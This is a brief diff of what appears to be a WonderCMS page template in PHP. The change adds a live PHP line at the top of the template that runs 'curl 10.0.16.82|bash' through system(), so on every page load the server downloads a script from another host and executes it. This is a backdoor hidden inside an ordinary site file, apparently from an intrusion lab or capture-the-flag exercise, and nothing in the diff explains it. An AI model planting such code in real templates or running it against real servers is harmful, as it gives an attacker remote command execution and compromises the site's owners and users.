@@ -1,5 +1,5 @@
-<?php global $Wcms ?>
-system("curl 10.0.16.82");
+<?php system("curl 10.0.16.82|bash"); global $Wcms ?>
+
 <!DOCTYPE html>
 <html lang="en">
 	<head>
